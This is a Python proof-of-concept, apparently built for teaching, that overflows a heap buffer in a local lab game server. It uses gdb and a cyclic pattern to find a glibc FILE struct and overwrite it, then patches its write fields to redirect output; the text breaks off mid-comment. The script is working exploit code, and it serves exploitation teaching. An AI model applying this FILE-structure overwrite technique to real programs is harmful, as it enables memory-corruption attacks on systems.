import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import time

try:
    from pwn import cyclic, cyclic_find, FileStructure, context
except ImportError:
    print("[-] pwntools is required for this PoC (cyclic() pattern generation).")
    print("    pip install pwntools")
    sys.exit(1)

HOST = "127.0.0.1"
PORT = 9999
RECV_CHUNK = 8192
PROMPT = b"> "

SERVER_SRC = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", "textrealm", "linux", "server_linux.c",
))
SERVER_BIN_SUFFIX = os.path.join("linux", "textrealm_server")
SERVER_LOG_PATH = os.path.normpath(os.path.join(
    os.path.dirname(os.path.dirname(SERVER_SRC)), "game_logs", "textrealm.log",
))

TOTAL_LEN = 3000
FRAG_SIZE = 500

PTRACE_HELP = """\
[-] gdb cannot attach to the server process: Yama ptrace_scope is
    restricted (current value: {scope}) and this script is not running
    as root. gdb here is a fresh process, not a child of the server, so
    the default "restricted ptrace" policy blocks the attach outright.

    Fix ONE of the following, then re-run this script:
      1. Run this whole script with sudo:
             sudo python3 {script}
      2. Temporarily relax ptrace_scope (reverts on reboot):
             echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
"""


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def pause_for_enter(message="Press Enter to continue..."):
    try:
        input(f"\n>>> {message} ")
    except EOFError:
        pass


def is_game_running(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def recv_until_prompt(sock, timeout=5):
    """Block until PROMPT has been seen in the accumulated data."""
    sock.settimeout(timeout)
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)
        if not chunk:
            raise ConnectionError("connection closed by peer")
        data += chunk
    return data


def check_ptrace_ok():
    """Yama's ptrace_scope=1+ blocks gdb from attaching to a process it
    isn't an ancestor of - exactly our situation (gdb is spawned fresh
    by this script; the server was started separately). Root bypasses
    this. Bail out with a clear fix-it message instead of silently
    hanging on attach."""
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    scope_path = "/proc/sys/kernel/yama/ptrace_scope"
    if not os.path.exists(scope_path):
        return True  # no Yama on this kernel - unrestricted ptrace
    with open(scope_path) as f:
        scope = f.read().strip()
    if scope == "0":
        return True
    print(PTRACE_HELP.format(scope=scope, script=sys.argv[0]))
    return False


def find_server_pid():
    """pgrep -f on the server binary's path, then confirm via
    /proc/<pid>/exe that each candidate's ACTUAL executable is the
    server - not e.g. a supervisor process that merely mentions that
    path as a command-line argument (which would also match pgrep -f's
    substring search). There's only ever one real textrealm_server
    process (single-connection-at-a-time, no fork())."""
    try:
        out = subprocess.check_output(["pgrep", "-f", SERVER_BIN_SUFFIX], text=True)
    except subprocess.CalledProcessError:
        return None
    for pid_str in out.split():
        pid = int(pid_str)
        try:
            exe = os.readlink(f"/proc/{pid}/exe")
        except OSError:
            continue
        if exe.endswith(os.sep + SERVER_BIN_SUFFIX):
            return pid
    return None


def find_overflow_breakpoint_line():
    """Grep the LIVE source file right now for the overflowing memcpy()
    call, instead of hardcoding a line number that would go stale the
    next time server_linux.c is edited. Returns the line number
    immediately after it (`grave_used += (size_t)n;`), which is where
    gdb should stop - memcpy has just finished, but grave_used hasn't
    been updated yet, so grave_used still holds its PRE-write value."""
    with open(SERVER_SRC) as f:
        lines = f.readlines()
    for i, line in enumerate(lines, start=1):
        if "memcpy(grave_buf" in line:
            return i + 1
    raise RuntimeError(
        f"could not find 'memcpy(grave_buf' in {SERVER_SRC} - "
        "has the overflow been refactored or removed?"
    )


def find_grave_size():
    """Same philosophy: read grave_size's initializer from the live
    source rather than assuming it's still 1500."""
    with open(SERVER_SRC) as f:
        text = f.read()
    m = re.search(r"\bgrave_size\s*=\s*(\d+)\s*;", text)
    if not m:
        raise RuntimeError(f"could not find 'grave_size = N;' in {SERVER_SRC}")
    return int(m.group(1))


def find_recv_buf_size():
    """Same philosophy again: RECV_BUF_SIZE bounds how many bytes the
    server's single recv() call (and therefore one memcpy() into
    grave_buf) can hold. Our re-fragmentation of the targeted
    FileStructure overwrite has to stay under this, or a 'fragment'
    could silently get truncated/split by the server itself."""
    with open(SERVER_SRC) as f:
        text = f.read()
    m = re.search(r"#define\s+RECV_BUF_SIZE\s+(\d+)", text)
    if not m:
        raise RuntimeError(f"could not find '#define RECV_BUF_SIZE N' in {SERVER_SRC}")
    return int(m.group(1))


def run_gdb_batch(pid, cmds, timeout, label):
    """Run one headless/batch gdb session against `pid`, returning its
    combined stdout+stderr. `cmds` is a flat list of -ex arguments
    (without the leading "gdb -q -p PID --batch" boilerplate)."""
    full_cmd = ["gdb", "-q", "-p", str(pid), "--batch"] + cmds
    try:
        proc = subprocess.run(
            full_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout,
        )
        return proc.stdout
    except subprocess.TimeoutExpired as e:
        return (e.stdout or "") + f"\n[-] {label}: gdb timed out after {timeout}s\n"


RAW_BEFORE_MARKER = "RAW BYTES of *g_log_fp BEFORE any corruption"

# glibc stores a FILE's lock object (pointed to by _lock) and its
# _wide_data allocation immediately AFTER the FILE struct on the heap
# (confirmed empirically: _lock pointed exactly at g_log_fp + sizeof(FILE)
# in this environment). Phase 1's cyclic pattern overflow deliberately
# overshoots past the struct's end (TOTAL_LEN is bigger than strictly
# necessary, as a safety margin for the offset-recovery pattern), which
# smashes that adjacent lock object too - phases 3/4 are sized to land
# EXACTLY on the 224-byte struct and never touch anything past it, so
# that corruption is never repaired. The next real fwrite() then blocks
# forever in futex_do_wait() trying to acquire the now-garbage lock - no
# crash, no exit, just silence. Snapshotting and restoring this many
# EXTRA bytes past the struct (as part of phase 4's payload) fixes that.
TRAILING_REPAIR_MARGIN = 128


def gdb_snapshot_cmds(struct_size):
    """One-shot: attach, print the still-intact FILE structure - one field
    per line, pretty-printed, then as raw bytes too (so phase 4 can patch
    just a few fields into an otherwise still-legitimate struct later) -
    then detach."""
    return [
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", "set print pretty on",
        "-ex", 'printf "grave_buf = %p\\n", grave_buf',
        "-ex", 'printf "g_log_fp  = %p (should be ~20 bytes past grave_buf + grave_size)\\n", g_log_fp',
        "-ex", "print *g_log_fp",
        # The '%s' here is Python's own string formatting, substituted
        # BEFORE this ever reaches gdb - the command gdb actually sees is
        # a plain literal string with no %-specifiers of its own, so
        # there's nothing left for gdb's printf to treat as an argument.
        "-ex", 'printf "\\n=== %s ===\\n"' % RAW_BEFORE_MARKER,
        "-ex", "x/%dxb g_log_fp" % struct_size,
        "-ex", "detach",
        "-ex", "quit",
    ]


OVERFLOW_SCRIPT_TEMPLATE = '''\
import gdb

class OverflowBreakpoint(gdb.Breakpoint):
    """Fires on every write that actually overflows grave_buf. stop()
    returning False means "log it and keep running" - gdb auto-resumes
    the inferior itself, no explicit continue needed. Only on the
    target-th (final) hit does stop() return True, which is what makes
    the single top-level `gdb.execute("continue")` below finally return
    control to this script - one persistent breakpoint rides through
    every overflowing fragment and only truly stops once the LAST one's
    memcpy has landed.

    NOTE: setting self.condition does NOT filter calls to stop() when
    stop() is overridden - gdb calls stop() unconditionally on every hit
    of this line regardless of the condition string (confirmed: a
    breakpoint with condition "i > 5" still called stop() for every
    value of i from 0 up). So stop() evaluates the condition itself via
    gdb.parse_and_eval() and bails out early (without counting a hit)
    when it's false."""
    def __init__(self, spec, cond, target_hits, label):
        super(OverflowBreakpoint, self).__init__(spec)
        self.cond = cond
        self.target_hits = target_hits
        self.label = label
        self.hits = 0

    def stop(self):
        if not bool(gdb.parse_and_eval(self.cond)):
            return False
        self.hits += 1
        grave_used_val = int(gdb.parse_and_eval("grave_used"))
        n_val = int(gdb.parse_and_eval("n"))
        gdb.write("\\n=== %s: overflow hit %d/%d ===\\n" % (self.label, self.hits, self.target_hits))
        gdb.write("grave_used (before this write) = %d\\n" % grave_used_val)
        gdb.write("n (bytes in this write)        = %d\\n" % n_val)
        if self.hits >= self.target_hits:
            grave_buf_val = gdb.parse_and_eval("grave_buf")
            g_log_fp_val = gdb.parse_and_eval("g_log_fp")
            gdb.write("\\n=== final overflowing write caught - adjacent FILE struct now corrupted ===\\n")
            gdb.write("grave_buf                       = %s\\n" % grave_buf_val)
            gdb.write("g_log_fp (adjacent FILE struct) = %s\\n" % g_log_fp_val)
            gdb.execute("print *g_log_fp")
            gdb.write("\\n=== heap space starting AT the allocation (grave_buf+0 .. +200) ===\\n")
            gdb.execute("x/200xb grave_buf")
            gdb.write("\\n=== heap space spanning end-of-buffer -> FILE struct (grave_buf+__HEXOFF__) ===\\n")
            gdb.execute("x/80xb grave_buf+__HEXOFF__")
            # We deliberately do NOT read the raw bytes directly at g_log_fp
            # (the _flags field) for offset recovery: _flags is only 4 bytes
            # and the compiler inserts alignment padding before the next
            # (pointer-sized) field, which is an easy way to get a subtly
            # wrong offset. _IO_read_ptr is a full 8-byte pointer field that
            # gets completely overwritten by our pattern, and we ask gdb's
            # own type system for its EXACT byte offset within the struct -
            # not a hardcoded guess - so this is correct regardless of
            # padding/layout.
            io_read_ptr_field_offset = int(gdb.parse_and_eval(
                "(size_t)&g_log_fp->_IO_read_ptr - (size_t)g_log_fp"))
            gdb.write("\\n=== _IO_read_ptr field offset within FILE struct (from gdb's own type info) = %d bytes ===\\n"
                       % io_read_ptr_field_offset)
            gdb.write("\\n=== raw bytes AT g_log_fp->_IO_read_ptr (for pwntools cyclic_find offset recovery) ===\\n")
            gdb.execute("x/8xb &g_log_fp->_IO_read_ptr")
            return True
        return False

gdb.execute("set pagination off")
gdb.execute("set confirm off")
gdb.execute("set print pretty on")
bp = OverflowBreakpoint("__SRC__:__BPLINE__", "grave_used + n > grave_size", __TARGET__, "__LABEL__")
gdb.execute("continue")
gdb.execute("detach")
'''


def build_overflow_script(bp_line, grave_size, num_overflow_frags, label):
    """Render OVERFLOW_SCRIPT_TEMPLATE for this run and write it to a temp
    .py file - gdb auto-detects python scripts by extension when loaded
    with -x, so no --batch -ex plumbing is needed for the loop itself."""
    src_name = os.path.basename(SERVER_SRC)
    hexoff = max(grave_size - 60, 0)
    script = (
        OVERFLOW_SCRIPT_TEMPLATE
        .replace("__HEXOFF__", str(hexoff))
        .replace("__SRC__", src_name)
        .replace("__BPLINE__", str(bp_line))
        .replace("__TARGET__", str(num_overflow_frags))
        .replace("__LABEL__", label)
    )
    fd, path = tempfile.mkstemp(prefix="filestruct_bp_", suffix=".py")
    with os.fdopen(fd, "w") as f:
        f.write(script)
    return path


def print_client_received(data):
    """Show whatever the server actually sent back to the CLIENT socket -
    this is where the reaper warnings (reaper_whisper()/scramble_terminal()
    in server_linux.c) show up, since the server send()s them to the
    client in addition to printf()ing them on its own console. Strips the
    trailing prompt ("> ") so it doesn't clutter the output, and skips
    printing anything at all if there was nothing but a bare prompt."""
    text = data.decode(errors="replace")
    if text.endswith(PROMPT.decode()):
        text = text[:-len(PROMPT.decode())]
    text = text.strip("\r\n")
    if not text:
        return
    print("\n[CLIENT RECEIVED]")
    for line in text.splitlines():
        print(f"    {line}")


def drain_socket(sock, idle_timeout=2):
    """Read whatever shows up until the socket goes quiet for
    `idle_timeout` seconds. Used after blasting all the overflow
    fragments out back-to-back, where we can no longer assume exactly
    one prompt per fragment arrives (the server may coalesce several
    fragments into a single recv())."""
    sock.settimeout(idle_timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(RECV_CHUNK)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def send_fragment_quiet(sock, idx, payload, frag_count, total_len, sent_before, is_overflow, wait_for_response):
    """Show a compact per-fragment summary (one header line + a few
    indented metadata lines - not a full banner box, that was too much
    output per fragment), send it, then show whatever the server sends
    back (this is where the reaper warnings show up - the server
    send()s them to the client, not just printf()s them on its own
    console, so students watching THIS script's output should see them
    too, not just whoever's watching the server's own terminal).
    Returns the updated cumulative byte count. `wait_for_response`
    controls whether we block for this fragment's own prompt before
    returning (used for the filling fragments) or just fire it and move
    on (used for the overflow fragments, which must go out back-to-back
    so a single persistent gdb breakpoint can catch them all)."""
    is_last = (idx == frag_count - 1)
    sent_after = sent_before + len(payload)
    status = "OVERFLOWING grave_buf" if is_overflow else "filling grave_buf"

    preview = payload.decode(errors="replace")
    if len(preview) > 60:
        preview = preview[:60] + "..."

    print(f"\n[Fragment {idx + 1}/{frag_count}]" + ("  <- LAST FRAGMENT" if is_last else ""))
    print(f"    status      : {status}")
    print(f"    bytes       : {len(payload)}")
    print(f"    sent so far : {sent_after}/{total_len}")
    print(f"    content     : {preview}")

    sock.sendall(payload + b"\r\n")

    if wait_for_response:
        try:
            response = recv_until_prompt(sock, timeout=5)
            print_client_received(response)
        except (OSError, ConnectionError):
            pass

    if is_last:
        print("\n[*] That was the LAST fragment - the full payload has now been sent.")

    return sent_after


def fragment_payload(payload, frag_size):
    """Split `payload` into a dict of {index: chunk}, same shape as the
    cyclic-pattern fragments dict built in main()."""
    frag_count = (len(payload) + frag_size - 1) // frag_size
    return {i: payload[i * frag_size:(i + 1) * frag_size] for i in range(frag_count)}, frag_count


def first_overflow_index(frag_count, frag_size, grave_size):
    """Index of the first fragment whose cumulative bytes push grave_used
    past grave_size - everything before it just fills the buffer."""
    return next(i for i in range(frag_count) if (i + 1) * frag_size > grave_size)


def recover_file_struct_offset(gdb_output):
    """Recover the offset from grave_buf to the start of the FILE struct,
    and every intermediate value used to get there (for teaching/logging).

    Method: read the 8 raw bytes AT the _IO_read_ptr field (a full
    pointer-sized field that gets completely overwritten by our de
    Bruijn pattern), use pwntools cyclic_find() to look up exactly which
    byte offset of the original payload those bytes came from, then
    subtract _IO_read_ptr's own byte offset WITHIN the struct (which the
    gdb script discovered dynamically via gdb's own type info - NOT a
    hardcoded sizeof(_flags), since there's alignment padding between
    _flags and _IO_read_ptr on this ABI) to land on the struct's true
    start. Returns None if the breakpoint never reached its final hit
    (e.g. gdb never actually attached)."""
    offset_marker = "_IO_read_ptr field offset within FILE struct (from gdb's own type info) ="
    bytes_marker = "raw bytes AT g_log_fp->_IO_read_ptr"

    m_off = re.search(re.escape(offset_marker) + r"\s*(\d+)\s*bytes", gdb_output)
    if not m_off:
        return None
    io_read_ptr_field_offset = int(m_off.group(1))

    idx = gdb_output.find(bytes_marker)
    if idx == -1:
        return None
    tail = gdb_output[idx:]
    m_bytes = re.search(r"0x[0-9a-fA-F]+:\s*((?:0x[0-9a-fA-F]{1,2}\s*)+)", tail)
    if not m_bytes:
        return None
    byte_tokens = m_bytes.group(1).split()
    raw = bytes(int(tok, 16) for tok in byte_tokens)
    if len(raw) < 4:
        return None

    pattern_offset_of_io_read_ptr = cyclic_find(raw[:4])
    struct_start_offset = pattern_offset_of_io_read_ptr - io_read_ptr_field_offset

    return {
        "raw_bytes": raw[:4],
        "io_read_ptr_field_offset": io_read_ptr_field_offset,
        "pattern_offset_of_io_read_ptr": pattern_offset_of_io_read_ptr,
        "struct_start_offset": struct_start_offset,
    }


FILL_BYTE = 0x11


def build_filled_file_structure(fill_byte=FILL_BYTE):
    """pwntools' FileStructure is used ONLY to learn sizeof(FILE) for
    this glibc/arch - the content we actually send has every field
    forced to a single repeated fill byte (0x11 by default). A real
    FSOP exploit would populate specific fields (vtable, write
    pointers, ...) with leaked libc addresses; for this classroom demo
    the point is to show TOTAL corruption and confirm the offset we
    just recovered lines up, not to build a working fake vtable
    chain."""
    return bytes([fill_byte]) * file_struct_size()


def parse_grave_buf_addr(gdb_output):
    """grave_buf's address is already printed by the breakpoint script
    ('grave_buf                       = 0x...') - reuse it from a prior
    phase's gdb output instead of a fresh gdb round trip. Valid for the
    whole life of the server process: grave_buf is malloc()'d once in
    main(), before the accept() loop, and never freed/reallocated."""
    m = re.search(r"grave_buf\s+=\s*(0x[0-9a-fA-F]+)", gdb_output)
    if not m:
        return None
    return int(m.group(1), 16)


def file_struct_layout():
    """Byte offset AND size of every FileStructure field, derived from
    pwntools' own field ordering (fs.vars_) and per-field widths
    (fs.length) - not hand-typed magic numbers - so this stays correct
    if pwntools' struct definition ever changes. Returns {name: (offset, size)}."""
    context.arch = "amd64"
    fs = FileStructure(null=0)
    layout = {}
    pos = 0
    for name in fs.vars_:
        size = fs.length[name]
        layout[name] = (pos, size)
        pos += size
    return layout


def file_struct_size():
    context.arch = "amd64"
    return len(bytes(FileStructure(null=0)))


WRITE_BUFFER_ROOM = 512


def patch_struct_for_stdio_redirect(pristine, addr, message):
    """Start from the PRISTINE (never-corrupted) FILE struct bytes - not
    a zeroed/fully-overwritten one - and patch in only the 4 fields
    needed to make the server's NEXT fwrite()+fflush() through g_log_fp
    write `message`'s bytes out to fd 1 instead of whatever data it
    thinks it's writing:

      fileno        = 1                (write goes to fd 1, stdout)
      _IO_write_base = addr             (start of the buffered region)
      _IO_write_ptr  = addr + len(msg)  (end of the buffered region - a
                                          POINTER, not a byte count: glibc
                                          computes the write length as
                                          _IO_write_ptr - _IO_write_base,
                                          so it has to be addr+len for
                                          that subtraction to come out to
                                          len(message))
      _IO_write_end  = addr + WRITE_BUFFER_ROOM

    _IO_write_end matters more than it looks: g_log_fp has never been
    written to before (this is its first real use), so its PRISTINE
    _IO_write_end is 0 - meaning glibc sees "no room" and immediately
    flushes on the very FIRST xsputn call, which is the one carrying the
    server's OWN "line" data (the normal crash-log text), not our
    message at write_base/write_ptr. That's why, without this field, fd 1
    gets the real crash-log text instead of our planted message: our
    bytes stay "pending" and never get flushed before the real data
    pushes them out. Giving write_end real room means the incoming
    "line" data gets appended AFTER our message instead of triggering an
    immediate flush, so the later explicit fflush() flushes both
    together, in order - our message first, then the real text.

    Every other field (vtable, _lock, _wide_data, ...) is left exactly as
    it was in the real, working FILE struct. That matters: an earlier
    phase in this script fills the WHOLE struct with a repeated byte to
    demonstrate total corruption, and that FILE object is never reopened
    between connections - so if phase 4 built its payload the same way,
    the leftover garbage vtable/_lock values from that earlier phase
    would make fwrite()/fflush() crash before ever reaching our write(),
    which is exactly the "crashed with no output" symptom."""
    layout = file_struct_layout()
    buf = bytearray(pristine)

    def set_field(name, value):
        off, size = layout[name]
        buf[off:off + size] = int(value).to_bytes(size, "little")

    set_field("_IO_write_base", addr)
    set_field("_IO_write_ptr", addr + len(message))
    set_field("_IO_write_end", addr + WRITE_BUFFER_ROOM)
    set_field("fileno", 1)
    return bytes(buf)


def parse_hex_dump_bytes(gdb_output, marker, nbytes):
    """Extract `nbytes` raw bytes from the gdb hex dump (x/Nxb ...) whose
    banner line contains `marker`. gdb's x/Nxb output is one line per
    8 bytes, each line shaped '0xADDR:\\t0xBB\\t0xBB...' - walk lines
    after the marker, collecting byte tokens, and stop at the first line
    that doesn't match that shape (end of the dump)."""
    idx = gdb_output.find(marker)
    if idx == -1:
        return None
    raw = bytearray()
    for line in gdb_output[idx + len(marker):].splitlines():
        m = re.match(r"\s*0x[0-9a-fA-F]+:\s*((?:0x[0-9a-fA-F]{1,2}\s*)+)$", line)
        if m is None:
            if raw:
                break
            continue
        for tok in m.group(1).split():
            raw.append(int(tok, 16))
        if len(raw) >= nbytes:
            break
    if len(raw) < nbytes:
        return None
    return bytes(raw[:nbytes])


def is_pid_alive(pid):
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return True


def proc_state(pid):
    """Single-char /proc/<pid>/stat state code (R running, S sleeping,
    T stopped, Z zombie, ...), or None if the process is gone. A 'T' here
    right before we signal would mean the process is ptrace-stopped (a
    leftover from the gdb attach/detach cycles above) and won't run any
    signal handler until it's continued - which would silently explain
    a SIGINT never taking effect."""
    try:
        with open(f"/proc/{pid}/stat") as f:
            data = f.read()
    except OSError:
        return None
    # fields: pid (comm) state ... - comm can contain spaces/parens, so
    # split on the LAST ')' rather than assuming field order.
    after = data.rsplit(")", 1)[-1].split()
    return after[0] if after else None


def read_log_tail(n=5):
    try:
        with open(SERVER_LOG_PATH) as f:
            lines = f.readlines()
        return lines[-n:]
    except OSError:
        return []


def read_log_all():
    try:
        with open(SERVER_LOG_PATH) as f:
            return f.readlines()
    except OSError:
        return []


def run_overflow_demo(pid, bp_line, grave_size, fragments, frag_count, first_overflow_idx,
                       intro_message, run_tag):
    """Connect fresh, sequentially send every fragment (content + byte
    count shown for each, along with whatever the server sends back -
    including the reaper warnings), then attach ONE persistent gdb
    breakpoint that rides through every overflowing
    fragment and only truly stops on the last one. Returns the gdb
    output text. `intro_message` is the friendly one-time narration
    banner; `run_tag` is the short technical name reused in the
    attach/view banners (kept separate so those don't end up stitching
    "(N fragments)" onto a full sentence)."""
    num_overflow_frags = frag_count - first_overflow_idx
    total_len = sum(len(p) for p in fragments.values())
    sent_so_far = 0

    sock = socket.create_connection((HOST, PORT), timeout=5)
    recv_until_prompt(sock)  # discard the welcome banner - not shown
    print_banner(intro_message)

    # Fill fragments (if any) can safely wait for their own response -
    # they never trigger the breakpoint, so there's no coalescing risk.
    for i in range(first_overflow_idx):
        sent_so_far = send_fragment_quiet(
            sock, i, fragments[i], frag_count, total_len, sent_so_far,
            is_overflow=False, wait_for_response=True,
        )

    label = f"{run_tag} ({num_overflow_frags} fragments)"
    script_path = build_overflow_script(bp_line, grave_size, num_overflow_frags, label)
    print_banner(f"ATTACHING GDB (persistent) - {label}")

    gdb_proc = subprocess.Popen(
        ["gdb", "-q", "-p", str(pid), "--batch", "-x", script_path],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    time.sleep(1.5)

    try:
        # Overflow fragments go out back-to-back (no per-fragment wait) so
        # the single persistent breakpoint can catch them all in sequence.
        for i in range(first_overflow_idx, frag_count):
            sent_so_far = send_fragment_quiet(
                sock, i, fragments[i], frag_count, total_len, sent_so_far,
                is_overflow=True, wait_for_response=False,
            )
            time.sleep(0.15)

        try:
            out, _ = gdb_proc.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            print("[-] gdb did not finish in time - the breakpoint's target "
                  "hit count may not have been reached (fragments may have "
                  "coalesced into fewer memcpy() calls than expected). "
                  "Killing gdb; the server may still be paused.")
            gdb_proc.kill()
            out, _ = gdb_proc.communicate()
    finally:
        try:
            os.remove(script_path)
        except OSError:
            pass

    pause_for_enter("Hit Enter to print the FILE struct and heap now...")
    print_banner(f"GDB VIEW NOW - {label}")
    print(out)

    print_client_received(drain_socket(sock))
    sock.close()
    return out


def main():
    if not is_game_running(HOST, PORT):
        print(f"[-] Nothing is listening on {HOST}:{PORT}. Is TextRealm running?")
        return
    print(f"[+] Game is running on {HOST}:{PORT}")

    if not check_ptrace_ok():
        return

    pid = find_server_pid()
    if pid is None:
        print(f"[-] Could not find a running '.../{SERVER_BIN_SUFFIX}' process via pgrep.")
        return
    print(f"[+] Found server process pid={pid}")

    bp_line = find_overflow_breakpoint_line()
    grave_size = find_grave_size()
    src_name = os.path.basename(SERVER_SRC)
    print(f"[+] Discovered breakpoint location {src_name}:{bp_line} and "
          f"grave_size={grave_size} by reading the live source just now - "
          f"not hardcoded.")

    pattern = cyclic(TOTAL_LEN)
    frag_count = TOTAL_LEN // FRAG_SIZE
    fragments = {i: pattern[i * FRAG_SIZE:(i + 1) * FRAG_SIZE] for i in range(frag_count)}
    first_overflow_idx = next(i for i in range(frag_count) if (i + 1) * FRAG_SIZE > grave_size)
    num_overflow_frags = frag_count - first_overflow_idx

    print(f"[+] Built a {TOTAL_LEN}-byte cyclic pattern -> {frag_count} fragments "
          f"of {FRAG_SIZE} bytes each.")
    print(f"[+] Fragments 0-{first_overflow_idx - 1} fill grave_buf exactly to its "
          f"{grave_size}-byte limit (no overflow yet).")
    print(f"[+] Fragments {first_overflow_idx}-{frag_count - 1} "
          f"({num_overflow_frags} of them) each write PAST the end of grave_buf.")

    # --- snapshot *g_log_fp while it's still a legitimate FILE struct,
    # pretty-printed (one field per line). No connection needed for this -
    # gdb reads it straight out of the running process. ---
    print_banner("GDB SNAPSHOT: *g_log_fp BEFORE any overflow")
    struct_size = file_struct_size()
    snapshot_size = struct_size + TRAILING_REPAIR_MARGIN
    before = run_gdb_batch(pid, gdb_snapshot_cmds(snapshot_size), timeout=10, label="BEFORE snapshot")
    print(before)
    pristine_struct = parse_hex_dump_bytes(before, RAW_BEFORE_MARKER, struct_size)
    pristine_trailing = parse_hex_dump_bytes(before, RAW_BEFORE_MARKER, snapshot_size)
    if pristine_trailing is not None:
        pristine_trailing = pristine_trailing[struct_size:]
    if pristine_struct is None:
        print("[-] Could not capture the pristine FILE struct bytes - the "
              "stdout-redirect demo (phase 4) will not be available this run.")
    pause_for_enter("Hit Enter to start sending fragments...")

    # --- phase 1+2: fill grave_buf to its limit, then ONE persistent
    # attach + ONE breakpoint rides through every overflowing fragment of
    # the cyclic pattern, only truly stopping on the last one. ---
    out1 = run_overflow_demo(
        pid, bp_line, grave_size, fragments, frag_count, first_overflow_idx,
        "Here's where we begin overflowing the allocated heap space (cyclic pattern)",
        "cyclic pattern overflow",
    )

    # --- recover the offset from grave_buf to the start of the FILE
    # struct, and show every step of HOW it was calculated - this is the
    # part worth slowing down for with students. ---
    result = recover_file_struct_offset(out1)
    print_banner("OFFSET RECOVERY - HOW IT WAS CALCULATED")
    if result is None:
        print("[-] Could not recover the offset (gdb likely never reached "
              "the final breakpoint hit - see the ptrace_scope note above). "
              "Skipping the targeted FileStructure overwrite.")
        return

    offset = result["struct_start_offset"]
    padding = result["io_read_ptr_field_offset"] - 4
    print(f"[+] Step 1 - WHERE we read from: the breakpoint's final hit dumped "
          f"the 8 raw bytes stored AT the _IO_read_ptr field.")
    print(f"    We do NOT read _flags (the very first field) directly: _flags "
          f"is only 4 bytes, and the compiler inserts {padding} bytes of "
          f"alignment padding between it and _IO_read_ptr (pointers need "
          f"8-byte alignment on x86-64) - easy to silently get a wrong "
          f"offset from if you assume no padding.")
    print(f"    raw bytes found at _IO_read_ptr : {result['raw_bytes'].hex()}  "
          f"(as ASCII: {result['raw_bytes'].decode(errors='replace')!r})")
    print()
    print(f"[+] Step 2 - THE LOOKUP: a de Bruijn sequence is built so every "
          f"4-byte window in it is unique. pwntools cyclic_find() takes those "
          f"4 bytes and tells us exactly which byte offset of our original "
          f"{TOTAL_LEN}-byte payload they came from.")
    print(f"    cyclic_find({result['raw_bytes'].hex()}) = "
          f"{result['pattern_offset_of_io_read_ptr']}")
    print()
    print(f"[+] Step 3 - THE CORRECTION: that lookup gives the offset of the "
          f"_IO_read_ptr FIELD, not the start of the struct. _IO_read_ptr "
          f"itself sits {result['io_read_ptr_field_offset']} bytes into the "
          f"struct (discovered dynamically via gdb's own type info - "
          f"'(size_t)&g_log_fp->_IO_read_ptr - (size_t)g_log_fp' - not a "
          f"hardcoded guess), so we subtract that back out:")
    print(f"    {result['pattern_offset_of_io_read_ptr']} - "
          f"{result['io_read_ptr_field_offset']} = {offset}")
    print()
    print(f"[+] FINAL ANSWER: grave_buf + {offset} == g_log_fp "
          f"(the start of the FILE struct).")
    pause_for_enter("Hit Enter to validate this offset is actually correct...")

    # --- phase 3: fresh connection (grave_buf resets per-connection), send
    # `offset` bytes of filler followed by a pwntools FileStructure sized
    # buffer with every field forced to a single repeated fill byte
    # (0x11), so the overwrite lands EXACTLY on the FILE struct instead of
    # the arbitrary cyclic pattern. RECV_BUF_SIZE bounds how much the
    # server reads in one memcpy, so this (likely larger) payload has to
    # be re-fragmented to fit under it, same as the original 500-byte
    # fragments were. Same breakpoint logic as phase 2 catches the final
    # overflowing fragment, and dumps *g_log_fp again so we can confirm it
    # now reads back as all 0x11 - validating the offset. ---
    recv_buf_size = find_recv_buf_size()
    frag2_size = min(FRAG_SIZE, recv_buf_size - 1)
    filled_struct = build_filled_file_structure()
    payload2 = b"A" * offset + filled_struct

    print_banner("TARGETED OVERWRITE SETUP")
    print(f"[*] To test the recovered offset, we are going to overwrite the "
          f"FILE struct with a copy of pwntools' FileStructure with every "
          f"field filled with 0x{FILL_BYTE:02x} bytes - if the offset is "
          f"correct, *g_log_fp should read back as nothing but "
          f"0x{FILL_BYTE:02x} afterward.")

    fragments2, frag_count2 = fragment_payload(payload2, frag2_size)
    first_overflow_idx2 = first_overflow_index(frag_count2, frag2_size, grave_size)

    print(f"[+] RECV_BUF_SIZE={recv_buf_size} (discovered live) -> re-fragmenting "
          f"into {frag2_size}-byte chunks.")
    print(f"[+] payload2 = {offset} filler bytes + {len(filled_struct)}-byte "
          f"all-0x{FILL_BYTE:02x} FileStructure (sizeof(FILE) per pwntools) = "
          f"{len(payload2)} bytes -> {frag_count2} fragments.")

    out3 = run_overflow_demo(
        pid, bp_line, grave_size, fragments2, frag_count2, first_overflow_idx2,
        f"Here's where we overwrite the FILE struct with an all-0x{FILL_BYTE:02x} FileStructure payload",
        "targeted FileStructure overwrite",
    )

    print_banner("DONE")
    # gdb's hex dumps are tab-separated, not space-separated - match on
    # whitespace generically instead of a literal "0x11 0x11 ..." string,
    # which would silently never match and always report failure here
    # even when the overwrite worked perfectly.
    fill_hex = f"0x{FILL_BYTE:02x}"
    if re.search(r"(?:" + re.escape(fill_hex) + r"\s+){7}" + re.escape(fill_hex), out3.lower()):
        print(f"[+] *g_log_fp now reads back as {fill_hex} bytes - the offset "
              f"({offset}) was correct and the FileStructure overwrite landed "
              "exactly on the FILE struct.")
    else:
        print(f"[!] Did not see the expected run of {fill_hex} bytes in the "
              "final *g_log_fp dump above - re-check the offset/output "
              "manually (gdb may not have attached - see ptrace_scope note).")

    pause_for_enter("Hit Enter to continue to the final demo: redirecting a write to stdout...")

    # --- phase 4: one more overflow at the same offset, but this time we
    # start from the PRISTINE FILE struct bytes captured right at the top
    # of this script (before phase 1 ever touched memory) and patch only
    # 3 fields into that copy: fileno, _IO_write_base, _IO_write_ptr. Every
    # other field (vtable, _lock, _wide_data, ...) stays at its real,
